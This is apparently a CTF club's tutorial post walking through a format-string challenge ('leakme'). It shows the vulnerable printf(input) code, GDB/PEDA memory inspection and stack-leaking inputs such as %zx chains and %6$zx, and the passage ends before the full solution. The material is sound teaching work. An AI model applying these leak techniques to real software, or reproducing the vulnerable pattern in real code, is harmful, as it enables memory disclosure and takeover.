---
layout: post
title: "UW printf chals: leakme"
date: 2019-01-18 03:35:00 -0600
published: true
---

*audience: sigpwny members after the meeting where we ran it. very tutorial-y*

This is very long and favors going in-depth so you can learn *why* we're doing things
rather than just giving you the solution. It probably could use some more editing.

---

Get onto a linux server (ask in Discord if you need one).
* EWS is inconvenient and not recommended.
* Ask in discord to get onto the underclassman server.
* Altenatively, if on Windows: [windows subsystem for linux](http://aka.ms/wslinstall), Ubuntu
* If on Linux: you can do all this locally.

I recommend you get on the `pwny` server — it has a bunch of nice tools installed.

Ask in #help if you're struggling!

---

### The goal

We want to guess a "magic number" — a randomly allocated variable. This *should* be impossible,
but because of the printf vulnerability, we can guess it and gain control of the system.

```c
void main() {
    // edited for clarity
    // This code generates a random number and stores it on the stack.
    int a = rand(); // stack-allocated variable
    echo();
    printf("Hey, what number am I thinking of? \n");
    challenge(a);
}
```

### Getting the binary and running it.

First, we will solve the challenge locally, with GDB. Then, we will connect to the
challenge server and use our solution to get the flag.

---

Connect to the server.

Open the source file [in your browser](http://ctf.sigpwny.com/files/5c7e2aa342fba517ba71253d57a3eac2/leakme.c) or a text editor of choice.

Download the binary on the server:
```bash
wget http://ctf.sigpwny.com/files/3c3833d93c58dfb2278ec5f41302b7ab/leakme
```

Mark it as executable.
```bash
chmod +x ./leakme
```

Try running it.
```bash
./leakme
Give me something to say:
hello
Holy hello, Batman!
Hey, what number am I thinking of?
69
Nope!
ian@underclassmen-vm:~$
```

### The vulnerability
Here is the interesting line of source code (with a little editing to highlight the important parts:
```c
void echo(){
    // edited for clarity
    printf("Give me something to say: \n");
    char input_string[100]; // allocate a buffer
    fgets(input_string, 99, stdin); // read in from the user
    printf("Holy ");
    printf(input_string); // VULNERABILITY!!!
    printf(", Batman!\n");
}
```

`fgets` simply reads from `stdin` (where you're typing) and stores to a buffer. 

`printf(input_string)` prints from the buffer and interprets format strings.

Since we can control the format strings, we can cause unintended behavior. This is good for our purposes (hacking)! Our end goal is to get control (execute a shell).

[More information](https://www.geeksforgeeks.org/format-string-vulnerability-and-prevention-with-example/).

### How it works
We can submit format strings that read and write memory. Let's starting with reading:
```
ian@underclassmen-vm:~$ ./leakme
Give me something to say:
%x
Holy 796c6f48, Batman!
Hey, what number am I thinking of?
^C
```

So what's happening is, we run the following code:
```c
    printf("Holy ");
    printf("%zx");
    printf(", Batman!\n");
```

This prints 4 bytes from the "next argument" at the time of the printf call, and prints it as hexadecimal. [This page is very useful](https://en.wikipedia.org/wiki/Printf_format_string#Type_field). According to it, we are printing a `unsigned int as a hexadecimal number.` We use `%zx` because we are on 64 bit. Let's try this in gdb.

We will:
* `disas`semble the echo function that contains the vulnerable printf.
* set a `breakpoint` on exactly that instruction
* `run` until we get there
* examine the `stack`.

### Navigating with GDB

```
ian@underclassmen-vm:~$ gdb ./leakme
Reading symbols from ./leakme...(no debugging symbols found)...done.

gdb-peda$ disas echo

Dump of assembler code for function echo:
   0x0000000000400857 <+0>: push   rbp
   0x0000000000400858 <+1>: mov    rbp,rsp
   0x000000000040085b <+4>: sub    rsp,0x70
   0x000000000040085f <+8>: mov    rax,QWORD PTR fs:0x28
   ... TRUNCATED ...
   0x00000000004008c5 <+110>:   call   0x4006f0 <printf@plt>
   0x00000000004008ca <+115>:   lea    rax,[rbp-0x70]
   0x00000000004008ce <+119>:   mov    rdi,rax
   0x00000000004008d1 <+122>:   mov    eax,0x0
   0x00000000004008d6 <+127>:   call   0x4006f0 <printf@plt>
   0x00000000004008db <+132>:   lea    rdi,[rip+0x1c9]
   0x00000000004008e2 <+139>:   call   0x4006c0 <puts@plt>
   0x00000000004008e7 <+144>:   nop
   ... TRUNCATED ...
   0x00000000004008fc <+165>:   leave
   0x00000000004008fd <+166>:   ret
End of assembler dump.

# this is the address of the second printf above (+127)
gdb-peda$ b * 0x00000000004008d6 
# this is the address of the second printf above (+127
Breakpoint 1 at 0x4008d6
gdb-peda$ run
Starting program: /home/ian/leakme
Give me something to say:
%zx
# at this point in time, gdb will print information about the current state of the CPU.
```

GDB is a handy tool. We have an extension for it, PEDA, which prints out a lot of 
information in a nice way. There are:
* `registers`, which hold values
* `code`:  which shows the disassembled code that is currently being executed
* `stack`: which holds function calls, variables, and arguments.

Let's take a look.

```
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x0
RDX: 0x0
RSI: 0x796c6f48 ('Holy')
RDI: 0x7fffffffe440 --> 0x787a25 ('%zx')
RBP: 0x7fffffffe4b0 --> 0x7fffffffe4e0 --> 0x400a00 (<__libc_csu_init>: push   r15)
RSP: 0x7fffffffe440 --> 0x787a25 ('%zx')
RIP: 0x4008d6 (<echo+127>:  call   0x4006f0 <printf@plt>)
R8 : 0x7ffff7fef4c0 (0x00007ffff7fef4c0)
R9 : 0x7ffff7fef4c0 (0x00007ffff7fef4c0)
R10: 0x3
R11: 0x7ffff7a48e80 (<__printf>:    sub    rsp,0xd8)
R12: 0x400770 (<_start>:    xor    ebp,ebp)
R13: 0x7fffffffe5c0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4008ca <echo+115>: lea    rax,[rbp-0x70]
   0x4008ce <echo+119>: mov    rdi,rax
   0x4008d1 <echo+122>: mov    eax,0x0
=> 0x4008d6 <echo+127>: call   0x4006f0 <printf@plt>
   0x4008db <echo+132>: lea    rdi,[rip+0x1c9]        # 0x400aab
   0x4008e2 <echo+139>: call   0x4006c0 <puts@plt>
   0x4008e7 <echo+144>: nop
   0x4008e8 <echo+145>: mov    rax,QWORD PTR [rbp-0x8]
Guessed arguments:
arg[0]: 0x7fffffffe440 --> 0x787a25 ('%zx')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe440 --> 0x787a25 ('%zx')
0008| 0x7fffffffe448 --> 0x0
0016| 0x7fffffffe450 --> 0x7ffff7ffa268 (add    BYTE PTR ss:[rax],al)
0024| 0x7fffffffe458 --> 0x7ffff7ffe710 --> 0x7ffff7ffa000 (jg     0x7ffff7ffa047)
0032| 0x7fffffffe460 --> 0x0
0040| 0x7fffffffe468 --> 0x0
0048| 0x7fffffffe470 --> 0x0
0056| 0x7fffffffe478 --> 0x756e6547 ('Genu')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004008d6 in echo ()
gdb-peda$
```

### A brief aside about the x86_64 calling convention

```
According to the ABI, the first 6 integer or pointer arguments to a
function are passed in registers. The first is placed in rdi, the second in
rsi, the third in rdx, and then rcx, r8 and r9. Only the 7th argument and
onwards are passed on the stack.
```
[via this excellent page about it](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)

The arguments to printf are passed via the registers. This is a big difference between 32 bit (x86) and 64 bit (x86_64).

You can reconstruct what it expects the arguments to be by pulling them from PEDA:

```
RDI: 0x7fffffffe440 --> 0x7825 ('%x')
RSI: 0x796c6f48 ('Holy')
RDX: 0x0
RCX: 0x0
R8 : 0x7ffff7fef4c0 (0x00007ffff7fef4c0)
R9 : 0x7ffff7fef4c0 (0x00007ffff7fef4c0)
```

So what happens if our format string has 7 consecutive locations?

```
# quit gdb for a sec
./leakme
Give me something to say:
%zx.%zx.%zx.%zx.%zx.%zx.%zx.
Holy 796c6f48.0.0.7ffff7fef4c0.7ffff7fef4c0.2e787a252e787a25.2e787a252e787a25., Batman!
```

Hmm. Those look awfully familiar, don't they? But what are those things on the end? Well, we can convert them to ascii....

```
python
>>> s = '2e787a252e787a25'
>>> s.decode('hex')
'.xz%.xz%'
# it's backward because of endianess.
```

Aha! It's the buffer that contains our format string, which is a stack-allocated variable. So it looks like the 6th format string item is the first thing that we read on the stack.

### The parameter field (how we get things based on a number)

But there's a problem! The thing we want is really far down the stack, and our buffer is not that big.

So we need to somehow specify where on the stack we want to reach. Luckily, format strings have this: it's called the [parameter field](https://en.wikipedia.org/wiki/Printf_format_string#Parameter_field).

```
# again, run without gdb
./leakme
Give me something to say:
%6$zx
Holy 787a243625, Batman!
Hey, what number am I thinking of?
^C
# python -c "print '787a243625'.decode('hex')"
xz$6%
# once again backwards b/c of endianess, slap a [::-1] on the end of the python string to reverse it.
```

### Getting the keys to the castle.
We want to access a stack 
